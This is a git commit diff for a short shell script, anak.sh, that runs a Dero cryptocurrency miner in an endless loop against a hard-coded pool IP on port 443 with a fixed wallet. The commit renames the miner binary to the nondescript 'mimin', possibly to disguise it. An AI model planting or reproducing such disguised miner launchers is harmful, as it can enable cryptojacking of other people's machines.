0dbe76c9f49d626455f9c562bd497b35340363b0
renilo <88342640+renilo@users.noreply.github.com>
2022-10-28 20:15:19 +0700

    Update anak.sh

--- anak.sh
+++ anak.sh
@@ -3,6 +3,6 @@ chmod 777 mimin
 
 #!/bin/bash
 while :; do
-    ./dero -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.Rig -r 170.187.197.220:443 -p stratum;
+    ./mimin -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.Rig -r 170.187.197.220:443 -p stratum;
     sleep 5;
 done
